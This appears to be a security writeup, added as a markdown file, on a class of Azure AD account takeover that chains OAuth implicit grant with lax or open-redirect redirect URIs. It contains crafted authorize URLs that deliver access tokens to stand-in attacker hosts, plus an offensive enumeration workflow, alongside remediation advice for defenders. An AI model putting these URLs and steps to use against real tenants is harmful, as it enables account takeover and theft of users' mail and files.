@@ -1,0 +1,177 @@
+---
+title: "One-Click Account Takeover via OAuth Implicit Flow and Lax Redirect URI Validation"
+summary: "Azure AD tenants that still allow the OAuth 2.0 implicit grant — paired with redirect URI lists that accept arbitrary domains, or with hosts in the allow-list that proxy redirects — give an attacker a single-link account takeover. The victim clicks a normal Microsoft login URL, authenticates against their real tenant, and the access token is delivered to an attacker-controlled domain in the URL fragment of the response."
+date: 2026-05-14
+severity: Critical
+cvss: 9.8
+cwe: "CWE-601"
+product: "Azure AD / Entra ID (configuration class)"
+status: "Public"
+tags: ["oauth", "azure-ad", "entra-id", "account-takeover", "identity", "class-of-vuln"]
+order: 5
+featured: false
+type: "Class"
+readingTime: 6
+---
+
+The OAuth 2.0 implicit grant flow was deprecated in
+[RFC 6749 §10.16](https://www.rfc-editor.org/rfc/rfc6749#section-10.16) and again in the more
+recent [OAuth 2.0 Security Best Current Practice draft](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics).
+The reason is straightforward: the access token is delivered in the URL fragment of the
+redirect response, which means it ends up in the browser's address bar and in any tab that
+the redirect target controls. The recommended replacement is the authorisation-code flow
+with PKCE.
+
+It is still possible — and common — to find Azure AD tenants in 2026 with implicit grant
+enabled on one or more registered applications. When that's combined with a redirect URI list
+that includes a domain the attacker controls — or with a host inside the allow-list that
+itself does an open redirect — the result is a one-click account takeover.
+
+I've seen this pattern three times in two months across independent engagements, all on
+otherwise mature Azure AD tenants. This writeup is the generic shape, written so it is useful
+both as a hunting heuristic on the offensive side and as an audit checklist on the
+defensive side.
+
+## The chain
+
+An Azure AD tenant has an Enterprise Application or App Registration that:
+
+- Has **implicit grant** enabled on the access-token or ID-token response type, and
+- Has at least one **redirect URI** that the attacker can reach.
+
+The attacker crafts a URL pointing at the victim's *real* `login.microsoftonline.com`
+endpoint, with `response_type=token`, the application's `client_id`, and a `redirect_uri`
+that the tenant accepts. The victim — already signed in, or signs in normally — authenticates
+against their genuine identity provider. The IDP responds with an HTTP 302 to the redirect
+URI, carrying the freshly minted access token in the URL fragment:
+
+```
+https://login.microsoftonline.com/<tenant>/oauth2/v2.0/authorize
+  ?response_type=token
+  &client_id=<app>
+  &redirect_uri=https://evil.example/steal
+  &scope=Mail.Read Files.ReadWrite.All openid
+  &nonce=<random>
+```
+
+If the tenant's allow-list contains `https://evil.example/steal` — or, more commonly, a URI
+that *redirects to* `https://evil.example/steal` — the IDP redirects the victim there with
+the access token attached. The attacker reads the fragment from the request log on
+`evil.example`, replays the token against Microsoft Graph, and operates as the victim for the
+lifetime of the token.
+
+No phishing page is needed. The victim sees a real Microsoft login flow.
+
+## Three variants worth checking
+
+The chain looks like one bug. It is actually three bugs in trench coats, any of which is
+sufficient.
+
+### 1. Wildcard or attacker-controlled redirect URI in the allow-list
+
+The cleanest variant. Some App Registrations carry redirect URIs that point at
+`localhost` or at a long-dead vendor domain that's expired and re-registered. If the
+attacker controls the domain, they own the chain.
+
+```http
+GET /tenant/oauth2/v2.0/authorize?response_type=token
+    &client_id=<app>
+    &redirect_uri=https://attacker.example/cb
+    &scope=Files.ReadWrite.All openid
+```
+
+→ Microsoft accepts the request, prompts the user, and redirects to
+`https://attacker.example/cb#access_token=...`. Tenant administrators rarely audit redirect
+URIs once an application is registered.
+
+### 2. Open redirect inside a trusted host in the allow-list
+
+The allow-list contains only legitimate domains, but one of them — typically a marketing or
+landing-page subdomain — implements its own redirect parameter that the attacker can abuse:
+
+```
+https://login.microsoftonline.com/.../authorize
+  ?redirect_uri=https://www.tenant.example/landing/redirect?to=https://evil.example
+```
+
+The implicit-grant response goes to `https://www.tenant.example/landing/redirect?to=...`,
+which immediately serves a 302 to `https://evil.example`. The browser follows the redirect
+*with the URL fragment intact*. The token lands on the attacker.
+
+This is the easiest variant to miss in an internal review because each layer in isolation
+looks fine: the allow-list is "clean", the marketing page works as designed, and Azure AD's
+redirect-validation logic is unchanged.
+
+### 3. Multi-app reuse of a forgiving client
+
+A tenant can have a dozen App Registrations. Implicit grant is only enabled on one obscure
+one. The attacker enumerates apps via the Microsoft Graph or simply guesses `client_id`s for
+well-known Microsoft first-party apps (Microsoft Office, Microsoft Teams, etc.) and picks
+the one that returns a valid token rather than an `AADSTS` error.
+
+This works because some first-party Microsoft apps still ship with implicit grant enabled for
+backward-compatibility reasons. If the redirect URI list on that app accepts an attacker
+domain — or, again, contains an open-redirect host — the rest of the chain follows.
+
+## Why it lands so often
+
+Three structural reasons:
+
+- **Implicit grant has not been disabled by default.** Azure AD app templates created years
+  ago left it on. The toggle is in App Registration → Authentication → Implicit grant
+  settings, but it is rarely revisited after an application is deployed.
+- **Redirect URI lists grow over time.** Test environments add `localhost:3000`, marketing
+  campaigns add transient landing pages, integrations add vendor hostnames. The list is
+  almost never pruned. A single forgotten entry is enough.
+- **Open redirects on first-party domains are tolerated.** A redirect parameter on a
+  landing page is treated as a usability feature, not a security primitive. The connection
+  between *the marketing redirect* and *the identity allow-list* is invisible until someone
+  chains them.
+
+## Remediation
+
+In order of priority for the tenant administrator:
+
+1. **Disable implicit grant on every App Registration**, including first-party apps where
+   the toggle is exposed. Migrate to the authorisation-code flow with PKCE. This single
+   change closes most of the attack surface.
+2. **Audit redirect URIs across every App Registration.** Anything pointing at `localhost`,
+   `127.0.0.1`, an expired vendor domain, or a wildcard subdomain is suspect. Remove URIs
+   that are no longer in use. Pin the remainder to exact-match HTTPS URLs.
+3. **Eliminate open redirects on any host that appears in a redirect URI allow-list.** A
+   redirect parameter that takes an arbitrary URL is fine on a static marketing page. It is
+   load-bearing security on an IDP allow-list domain. Use a fixed allow-list of redirect
+   targets server-side, or pin to a single internal destination.
+4. **Enable Conditional Access policies** that gate token issuance on device compliance and
+   IP context. A successful implicit-grant attack still has to pass Conditional Access.
+   Locked-down device posture is the second line.
+5. **Monitor** `IdentityProtection` and `AADSTS` events for `response_type=token` requests
+   against high-value apps. The implicit grant flow should be a near-zero-cardinality event
+   in 2026; spikes are worth investigating.
+
+## What a hunter looks for
+
+On the offensive side, the workflow is:
+
+1. Enumerate the tenant via
+   `https://login.microsoftonline.com/<tenant>/.well-known/openid-configuration` and the
+   discoverable App Registration list.
+2. For each known `client_id`, attempt an authorisation request with
+   `response_type=token` and a controlled `redirect_uri`. Most return
+   `AADSTS500113` or `AADSTS500112`. The interesting ones return a usable token or a
+   redirect to your domain.
+3. For each app that accepts the call, walk the redirect URI list to find the host that
+   tolerates an open redirect, or the wildcard / dead-domain entry.
+4. Craft the final URL and demonstrate token retrieval against
+   `https://graph.microsoft.com/v1.0/me`.
+
+The whole chain typically takes thirty minutes against a tenant the attacker has visibility
+into. The remediation list above is the work of an afternoon.
+
+## Closing note
+
+OAuth implicit grant is one of those primitives that everyone knows is "deprecated" without
+internalising what that means operationally. Deprecation does not turn the toggle off in
+existing tenants. The configuration sits there until somebody removes it, and as long as it
+sits there, the chain above keeps landing. Auditing for it is one of the cheapest, highest
+yield exercises an identity team can do this quarter.
